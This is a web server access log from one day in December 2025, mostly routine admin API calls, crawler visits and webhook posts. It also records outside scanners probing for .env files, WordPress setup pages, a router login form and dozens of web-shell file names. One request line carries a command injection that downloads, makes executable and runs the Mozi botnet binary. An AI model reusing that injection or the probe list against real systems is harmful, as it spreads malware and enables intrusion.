3.172.65.237 - - [26/Dec/2025:02:51:29 +0000] "GET /api/admin/mails/694df7334b824bc0caef652b HTTP/1.1" 200 630 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" "118.217.235.170"
3.172.65.237 - - [26/Dec/2025:02:51:37 +0000] "GET /api/admin/mails?folder=trash HTTP/1.1" 200 44 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" "118.217.235.170"
3.172.65.237 - - [26/Dec/2025:02:51:41 +0000] "GET /api/admin/mails?direction=inbound&folder=inbox HTTP/1.1" 200 650 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" "118.217.235.170"
3.172.65.237 - - [26/Dec/2025:02:51:42 +0000] "GET /api/chats/support-room HTTP/1.1" 200 639 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" "118.217.235.170"
3.172.65.237 - - [26/Dec/2025:02:51:43 +0000] "GET /api/admin/mails/694df7334b824bc0caef652b HTTP/1.1" 200 630 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" "118.217.235.170"
3.172.65.237 - - [26/Dec/2025:02:51:55 +0000] "GET /api/admin/mails/694df7334b824bc0caef652b HTTP/1.1" 200 630 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" "118.217.235.170"
3.172.65.237 - - [26/Dec/2025:02:51:56 +0000] "GET /api/admin/mails/694df7334b824bc0caef652b HTTP/1.1" 200 630 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" "118.217.235.170"
3.172.65.214 - - [26/Dec/2025:02:52:05 +0000] "POST /api/admin/mails/download-url HTTP/1.1" 200 480 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" "118.217.235.170"
64.252.68.50 - - [26/Dec/2025:03:00:24 +0000] "GET /robots.txt HTTP/1.1" 200 160 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "66.249.64.73"
64.252.68.50 - - [26/Dec/2025:03:00:25 +0000] "GET /og-image.png HTTP/1.1" 200 413008 "-" "Googlebot-Image/1.0" "66.249.64.73"
20.168.122.61 - - [26/Dec/2025:03:01:48 +0000] "MGLNDD_13.203.56.190_80" 400 150 "-" "-" "-"
141.98.11.140 - - [26/Dec/2025:03:02:29 +0000] "GET / HTTP/1.1" 200 1290 "-" "-" "-"
20.163.14.102 - - [26/Dec/2025:03:05:02 +0000] "GET /developmentserver/metadatauploader HTTP/1.1" 200 1290 "-" "Mozilla/5.0 zgrab/0.x" "-"
204.76.203.219 - - [26/Dec/2025:03:24:43 +0000] "GET / HTTP/1.1" 200 1290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
165.22.184.62 - - [26/Dec/2025:03:39:33 +0000] "GET / HTTP/1.1" 200 1290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0" "-"
64.252.87.252 - - [26/Dec/2025:04:13:56 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 200 1290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" "2a06:98c0:3600::103, 104.23.221.95"
15.158.30.83 - - [26/Dec/2025:04:14:00 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 200 1290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" "2a06:98c0:3600::103, 104.23.223.65"
64.252.89.137 - - [26/Dec/2025:04:16:29 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 200 1290 "-" "http://abuts.fit/wp-admin/setup-config.php" "2a06:98c0:3600::103, 104.23.223.64"
64.252.89.137 - - [26/Dec/2025:04:16:29 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 200 1290 "-" "https://abuts.fit/wp-admin/setup-config.php" "2a06:98c0:3600::103, 104.23.217.56"
43.165.65.180 - - [26/Dec/2025:04:23:53 +0000] "GET / HTTP/1.1" 200 1290 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
13.124.199.42 - - [26/Dec/2025:04:25:48 +0000] "GET /api/chats/support-room HTTP/1.1" 200 639 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" "118.217.235.170"
3.172.65.237 - - [26/Dec/2025:04:28:48 +0000] "GET /api/chats/support-room HTTP/1.1" 200 639 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" "118.217.235.170"
3.172.65.237 - - [26/Dec/2025:04:29:48 +0000] "GET /api/chats/support-room HTTP/1.1" 200 639 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" "118.217.235.170"
18.68.4.146 - - [26/Dec/2025:04:34:31 +0000] "GET /robots.txt HTTP/1.1" 200 160 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "66.249.64.76"
64.252.66.55 - - [26/Dec/2025:04:34:31 +0000] "GET /index.html HTTP/1.1" 200 1290 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.122 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "66.249.64.74"
64.252.77.32 - - [26/Dec/2025:04:39:21 +0000] "GET /index.html HTTP/1.1" 200 1290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "172.234.196.248"
18.68.4.146 - - [26/Dec/2025:04:40:08 +0000] "GET /index.html HTTP/1.1" 200 1290 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "66.249.64.75"
18.68.4.146 - - [26/Dec/2025:04:40:25 +0000] "GET /index.html HTTP/1.1" 200 1290 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "66.249.64.74"
64.252.68.50 - - [26/Dec/2025:04:40:44 +0000] "GET /favicon.ico HTTP/1.1" 200 7645 "-" "Googlebot-Image/1.0" "66.249.64.73"
15.158.25.238 - - [26/Dec/2025:04:44:39 +0000] "POST /api/webhooks/mail HTTP/1.1" 200 625 "-" "node-fetch" "13.201.104.105"
15.158.25.238 - - [26/Dec/2025:04:44:50 +0000] "POST /api/webhooks/mail HTTP/1.1" 200 634 "-" "node-fetch" "13.201.104.105"
45.135.194.23 - - [26/Dec/2025:04:53:47 +0000] "GET / HTTP/1.1" 200 1290 "-" "-" "-"
18.68.4.146 - - [26/Dec/2025:05:00:49 +0000] "GET /favicon.ico HTTP/1.1" 200 7645 "-" "Googlebot-Image/1.0" "66.249.64.70"
5.181.188.211 - - [26/Dec/2025:05:18:57 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 9 "http://13.203.56.190:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0" "-"
5.181.188.211 - - [26/Dec/2025:05:18:57 +0000] "" 400 0 "-" "-" "-"
204.76.203.219 - - [26/Dec/2025:05:30:36 +0000] "GET / HTTP/1.1" 200 1290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
113.56.161.14 - - [26/Dec/2025:05:38:56 +0000] "GET / HTTP/1.1" 200 1290 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15" "-"
93.174.93.12 - - [26/Dec/2025:05:38:59 +0000] "GET / HTTP/1.0" 400 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML like Gecko) Maxthon/4.0.0.2000 Chrome/22.0.1229.79 Safari/537.1" "-"
64.252.87.252 - - [26/Dec/2025:05:43:26 +0000] "GET /.env HTTP/1.1" 200 1290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3" "204.76.203.25"
45.79.181.94 - - [26/Dec/2025:05:45:43 +0000] "\x16\x03\x01\x01" 400 150 "-" "-" "-"
45.79.181.94 - - [26/Dec/2025:05:45:44 +0000] "\x16\x03\x01\x01" 400 150 "-" "-" "-"
117.205.89.41 - - [26/Dec/2025:05:52:23 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 150 "-" "-" "-"
64.252.112.9 - - [26/Dec/2025:05:54:03 +0000] "GET /.well-known/acme-challenge/file.php HTTP/1.1" 200 1290 "https://www.google.co.uk/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1" "246.12.122.51, 4.241.216.133"
64.252.113.82 - - [26/Dec/2025:05:54:04 +0000] "GET /.well-known/acme-challenge/wp-login.php HTTP/1.1" 200 1290 "https://www.yahoo.com/" "Mozilla/5.0 (Linux; Android 13; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "228.155.179.36, 4.241.216.133"
64.252.113.161 - - [26/Dec/2025:05:54:04 +0000] "GET /.well-known/pki-validation/index.php HTTP/1.1" 200 1290 "https://www.google.fr/" "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36" "213.136.198.208, 4.241.216.133"
64.252.113.82 - - [26/Dec/2025:05:54:04 +0000] "GET /wp-admin/autoload_classmap.php HTTP/1.1" 200 1290 "https://www.google.de/" "Mozilla/5.0 (Linux; Android 12; V2134) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "16.46.94.131, 4.241.216.133"
64.252.113.82 - - [26/Dec/2025:05:54:04 +0000] "GET /autoload_classmap/function.php HTTP/1.1" 200 1290 "https://www.yahoo.com/" "Mozilla/5.0 (iPad; CPU OS 16_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1" "19.1.98.117, 4.241.216.133"
64.252.113.82 - - [26/Dec/2025:05:54:04 +0000] "GET /wp-content/autoload_classmap.php HTTP/1.1" 200 1290 "https://www.google.fr/" "Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36" "151.57.127.97, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:04 +0000] "GET /wp-includes/sitemaps/autoload_classmap.php HTTP/1.1" 200 1290 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "153.169.68.205, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:05 +0000] "GET /wp-includes/SimplePie/autoload_classmap.php HTTP/1.1" 200 1290 "https://www.yahoo.com/" "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36" "206.41.187.134, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:05 +0000] "GET /wp-includes/Text/autoload_classmap.php HTTP/1.1" 200 1290 "https://www.google.de/" "Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36" "60.171.117.124, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:05 +0000] "GET /wp-admin/js/autoload_classmap.php HTTP/1.1" 200 1290 "https://duckduckgo.com/" "Mozilla/5.0 (iPad; CPU OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.1" "121.69.211.149, 4.241.216.133"
64.252.113.161 - - [26/Dec/2025:05:54:05 +0000] "GET /wp-includes/SimplePie/chosen.php HTTP/1.1" 200 1290 "https://www.google.fr/" "Mozilla/5.0 (Linux; Android 12; V2134) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "229.125.41.78, 4.241.216.133"
64.252.113.161 - - [26/Dec/2025:05:54:05 +0000] "GET /wp-includes/assets/autoload_classmap.php HTTP/1.1" 200 1290 "https://www.google.de/" "Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36" "127.62.6.180, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:05 +0000] "GET /wp-includes/css/autoload_classmap.php HTTP/1.1" 200 1290 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "38.97.41.149, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:05 +0000] "GET /wp-includes/fonts/autoload_classmap.php HTTP/1.1" 200 1290 "https://www.google.de/" "Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36" "134.26.149.243, 4.241.216.133"
64.252.113.161 - - [26/Dec/2025:05:54:06 +0000] "GET /wp-includes/style-engine/autoload_classmap.php HTTP/1.1" 200 1290 "https://www.google.de/" "Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36" "57.246.14.17, 4.241.216.133"
64.252.113.161 - - [26/Dec/2025:05:54:06 +0000] "GET /wp-includes/widgets/autoload_classmap.php HTTP/1.1" 200 1290 "https://www.bing.com/" "Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "208.193.114.52, 4.241.216.133"
64.252.113.161 - - [26/Dec/2025:05:54:06 +0000] "GET /bolt.php HTTP/1.1" 200 1290 "https://www.google.fr/" "Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36" "87.159.220.38, 4.241.216.133"
64.252.113.161 - - [26/Dec/2025:05:54:06 +0000] "GET /1.php HTTP/1.1" 200 1290 "https://www.google.de/" "Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36" "118.202.102.81, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:06 +0000] "GET /aa.php HTTP/1.1" 200 1290 "https://duckduckgo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1" "148.187.126.221, 4.241.216.133"
64.252.113.82 - - [26/Dec/2025:05:54:06 +0000] "GET /abcd.php HTTP/1.1" 200 1290 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "85.253.5.114, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:06 +0000] "GET /about.php HTTP/1.1" 200 1290 "https://www.google.fr/" "Mozilla/5.0 (iPad; CPU OS 16_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1" "144.245.75.76, 4.241.216.133"
64.252.113.82 - - [26/Dec/2025:05:54:07 +0000] "GET /.well-known/index.php HTTP/1.1" 200 1290 "https://duckduckgo.com/" "Mozilla/5.0 (Linux; Android 11; CPH2251) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "92.102.27.88, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:07 +0000] "GET /admin.php HTTP/1.1" 200 1290 "https://www.google.co.uk/" "Mozilla/5.0 (iPad; CPU OS 16_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1" "240.214.18.242, 4.241.216.133"
64.252.113.82 - - [26/Dec/2025:05:54:07 +0000] "GET /adminfuns.php HTTP/1.1" 200 1290 "https://www.google.co.uk/" "Mozilla/5.0 (Linux; Android 13; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "24.240.55.196, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:07 +0000] "GET /alfa.php HTTP/1.1" 200 1290 "https://www.google.de/" "Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "254.44.97.1, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:07 +0000] "GET /api.php HTTP/1.1" 200 1290 "https://duckduckgo.com/" "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36" "213.202.92.163, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:07 +0000] "GET /bless.php HTTP/1.1" 200 1290 "https://duckduckgo.com/" "Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "112.11.156.195, 4.241.216.133"
64.252.113.82 - - [26/Dec/2025:05:54:07 +0000] "GET /cgi-bin/index.php HTTP/1.1" 200 1290 "https://duckduckgo.com/" "Mozilla/5.0 (Linux; Android 12; V2134) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "110.27.240.75, 4.241.216.133"
64.252.113.161 - - [26/Dec/2025:05:54:08 +0000] "GET /classwithtostring.php HTTP/1.1" 200 1290 "https://www.google.fr/" "Mozilla/5.0 (Linux; Android 12; V2134) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "11.78.58.152, 4.241.216.133"
64.252.113.82 - - [26/Dec/2025:05:54:08 +0000] "GET /edit.php HTTP/1.1" 200 1290 "https://duckduckgo.com/" "Mozilla/5.0 (Linux; Android 11; 21081111RG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "177.126.121.46, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:08 +0000] "GET /file.php HTTP/1.1" 200 1290 "https://www.bing.com/" "Mozilla/5.0 (Linux; Android 11; 21081111RG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "128.172.82.14, 4.241.216.133"
64.252.113.82 - - [26/Dec/2025:05:54:08 +0000] "GET /goods.php HTTP/1.1" 200 1290 "https://www.bing.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36" "63.196.63.127, 4.241.216.133"
64.252.113.82 - - [26/Dec/2025:05:54:08 +0000] "GET /info.php HTTP/1.1" 200 1290 "https://www.google.co.uk/" "Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36" "138.229.108.101, 4.241.216.133"
64.252.113.161 - - [26/Dec/2025:05:54:08 +0000] "GET /ioxi-o.php HTTP/1.1" 200 1290 "https://duckduckgo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1" "125.93.130.40, 4.241.216.133"
64.252.113.82 - - [26/Dec/2025:05:54:08 +0000] "GET /manager.php HTTP/1.1" 200 1290 "https://www.google.de/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36" "200.33.66.34, 4.241.216.133"
64.252.113.82 - - [26/Dec/2025:05:54:09 +0000] "GET /mini HTTP/1.1" 200 1290 "https://www.google.de/" "Mozilla/5.0 (iPad; CPU OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.1" "235.251.159.158, 4.241.216.133"
64.252.113.82 - - [26/Dec/2025:05:54:09 +0000] "GET /wp-user.php HTTP/1.1" 200 1290 "https://www.bing.com/" "Mozilla/5.0 (Linux; Android 13; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "44.138.217.148, 4.241.216.133"
64.252.113.82 - - [26/Dec/2025:05:54:09 +0000] "GET /wp.php HTTP/1.1" 200 1290 "https://www.yahoo.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36" "188.183.2.184, 4.241.216.133"
64.252.113.161 - - [26/Dec/2025:05:54:09 +0000] "GET /xmrlpc.php HTTP/1.1" 200 1290 "https://www.google.co.uk/" "Mozilla/5.0 (Linux; Android 12; V2134) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "25.127.59.29, 4.241.216.133"
64.252.113.161 - - [26/Dec/2025:05:54:09 +0000] "GET /ahax.php HTTP/1.1" 200 1290 "https://www.google.fr/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1" "222.41.251.252, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:09 +0000] "GET /akcc.php HTTP/1.1" 200 1290 "https://www.google.co.uk/" "Mozilla/5.g (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "134.123.108.86, 4.241.216.133"
64.252.113.161 - - [26/Dec/2025:05:54:09 +0000] "GET /assets/ HTTP/1.1" 200 1290 "https://www.yahoo.com/" "Mozilla/5.0 (Linux; Android 13; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "230.246.229.226, 4.241.216.133"
64.252.113.82 - - [26/Dec/2025:05:54:10 +0000] "GET /assets/images/ HTTP/1.1" 200 1290 "https://duckduckgo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.1" "198.255.207.12, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:10 +0000] "GET /av.php HTTP/1.1" 200 1290 "https://duckduckgo.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36" "219.156.184.246, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:10 +0000] "GET /buy.php HTTP/1.1" 200 1290 "https://www.yahoo.com/" "Mozilla/5.g (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "136.248.24.150, 4.241.216.133"
64.252.113.161 - - [26/Dec/2025:05:54:10 +0000] "GET /cgi-bin/ HTTP/1.1" 200 1290 "https://www.google.de/" "Mozilla/5.0 (Linux; Android 13; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "153.199.96.66, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:10 +0000] "GET /chosen.php HTTP/1.1" 200 1290 "https://www.google.fr/" "Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "239.193.234.185, 4.241.216.133"
64.252.113.82 - - [26/Dec/2025:05:54:10 +0000] "GET /css/index.php HTTP/1.1" 200 1290 "https://www.google.com/" "Mozilla/5.0 (iPad; CPU OS 16_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1" "23.238.156.168, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:10 +0000] "GET /elp.php HTTP/1.1" 200 1290 "https://duckduckgo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.1" "83.46.50.56, 4.241.216.133"
64.252.113.161 - - [26/Dec/2025:05:54:11 +0000] "GET /images/ HTTP/1.1" 200 1290 "https://www.google.de/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1" "77.164.208.13, 4.241.216.133"
64.252.113.82 - - [26/Dec/2025:05:54:11 +0000] "GET /index/function.php HTTP/1.1" 200 1290 "https://www.google.fr/" "Mozilla/5.0 (Linux; Android 11; CPH2251) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "2.66.235.52, 4.241.216.133"
64.252.113.161 - - [26/Dec/2025:05:54:11 +0000] "GET /inputs.php HTTP/1.1" 200 1290 "https://www.yahoo.com/" "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36" "135.224.75.136, 4.241.216.133"
64.252.113.161 - - [26/Dec/2025:05:54:11 +0000] "GET /mah.php HTTP/1.1" 200 1290 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 11; 21081111RG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "92.181.109.107, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:11 +0000] "GET /mah/function.php HTTP/1.1" 200 1290 "https://www.yahoo.com/" "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36" "91.135.199.64, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:11 +0000] "GET /mini.php HTTP/1.1" 200 1290 "https://www.google.fr/" "Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "135.183.65.73, 4.241.216.133"
64.252.113.161 - - [26/Dec/2025:05:54:11 +0000] "GET /modules/mod_simplefileuploadv1.3/elements/ HTTP/1.1" 200 1290 "https://www.google.de/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Mobile/15E148 Safari/604.1" "144.39.179.16, 4.241.216.133"
64.252.113.82 - - [26/Dec/2025:05:54:12 +0000] "GET /new.php HTTP/1.1" 200 1290 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1" "250.214.24.250, 4.241.216.133"
64.252.113.82 - - [26/Dec/2025:05:54:12 +0000] "GET /options-reading.php HTTP/1.1" 200 1290 "https://www.google.co.uk/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/118.0 Mobile/15E148 Safari/605.1.15" "199.150.108.213, 4.241.216.133"
